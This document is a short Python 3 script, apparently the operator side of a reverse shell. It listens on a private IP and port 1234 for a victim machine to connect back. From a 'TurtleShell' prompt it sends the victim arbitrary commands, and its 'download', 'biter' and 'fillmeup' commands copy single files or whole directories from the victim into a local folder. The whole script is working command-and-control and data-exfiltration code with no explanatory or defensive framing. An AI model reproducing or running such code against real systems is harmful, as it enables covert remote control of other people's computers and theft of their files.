#!/usr/bin/python3

import socket
import subprocess
import os
import re

def connect():
    s=socket.socket()
    s.bind(('192.168.56.105',1234))
    s.listen(1)
    print('Listening for my buddy~~~~~')
    conn,addr=s.accept()
    print('Ayeeee, we got a connection from',addr)
    print(conn)
    return conn
        
def download(conn,command):
    conn.send(command.encode())
    phrase,path=command.split(' ')
    f=open('/root/Desktop/copied/'+path,'wb')
    while True:
        bits=conn.recv(1024)
        if bits.endswith('done'.encode()):
            f.write(bits[:-4])
            f.close()
            print('Transfered')
            break
        if 'Nope file'.encode() in bits:
            print('No file exists')
            break
        f.write(bits)

def terminalStyle(conn):
    while True:
        
        try:
            command=input('TurtleShell~~| ')
            length=len(command)
            if 'kill' in command:
                print('Omae wo shindeiru!!')
                conn.send('Omae wo shindeiru!!'.encode())
                conn.close()
                break
            elif 'ls' in command:
                conn.send(command.encode())
                output=conn.recv(1024)
                print(output.decode())
            elif 'cd' in command:
                conn.send(command.encode())
                continue
            elif 'biter' in command:
                copyList=[]
                conn.send('biter'.encode())
                numFiles=conn.recv(1024).decode()
                for i in range(0,int(numFiles)):
                    temp=conn.recv(1024).decode()
                    if 'directory' not in temp:
                        separate,separateExtra=temp.split(':')
                        #command='download ' + separate
                        #download(conn,command)
                        copyList.append(separate)
                        print(copyList)
                for i in copyList:
                    download(conn,'download ' + i)
            elif (length==0):
                conn.send('psyche'.encode())
                print(conn.recv(1024).decode())
            elif 'download' in command:
                download(conn,command)
            elif 'fillmeup' in command:
                print('fillmeup')
                copyList=[]
                conn.send('fillmeup'.encode())
                numFiles=conn.recv(1024).decode()
                for i in range(0,int(numFiles)):
                    temp=conn.recv(1024).decode()
                    if 'directory' not in temp:
                        separate,separateExtra=temp.split(':')
                        #command='download ' + separate
                        #download(conn,command)
                        copyList.append(separate)
                        print(copyList)
                for i in copyList:
                    download(conn,'download ' + i)
            else:
                conn.send(command.encode())
                print(conn.recv(1024).decode())
                
        except KeyboardInterrupt:
            print('Omae wo shindeiru!!')
            conn.send('Omae wo shindeiru!!'.encode())
            conn.close()
            break
            

conn=connect()
terminalStyle(conn)



